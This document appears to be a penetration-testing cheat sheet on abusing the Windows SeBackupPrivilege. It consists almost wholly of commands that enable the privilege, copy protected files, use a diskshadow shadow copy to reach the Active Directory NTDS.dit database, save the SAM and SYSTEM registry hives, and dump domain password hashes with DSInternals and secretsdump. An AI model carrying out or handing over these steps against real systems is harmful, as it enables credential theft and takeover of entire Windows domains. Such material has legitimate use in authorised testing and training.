# SeBackupPrivilege
PoC :https://github.com/giuliano108/SeBackupPrivilege

## Importing Libraries
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

## check if SeBackupPrivilege is Enabled
```powershell
whoami /priv
  SeBackupPrivilege             Back up files and directories  Disabled
```
## if it's disable enable it
```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
### Copying a Protected File
```powershell
Copy-FileSeBackupPrivilege 'C:\Path\ Cred.txt' .\Cred.txt
```
## Copying NTDS.dit
NTDS.dit contains the NTLM hashes for all user and computer objects in the domain.
```powershell
# create a shadow copy of the C drive and expose it as E drive
diskshadow.exe
      DISKSHADOW> set verbose on
      DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
      DISKSHADOW> set context clientaccessible
      DISKSHADOW> set context persistent
      DISKSHADOW> begin backup
      DISKSHADOW> add volume C: alias cdrive
      DISKSHADOW> create
      DISKSHADOW> expose %cdrive% E:
      DISKSHADOW> end backup
      DISKSHADOW> exit
```
##  Copying NTDS.dit Locally
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\ntds.dit
```
## extract local account credentials
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
## Extracting Credentials from NTDS.dit
### DSInternals 
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=DC'sNAME,DC=local' -DBPath .\ntds.dit -BootKey $key
```
### SecretsDump
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
## Copying Files with Robocopy
```bash
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```



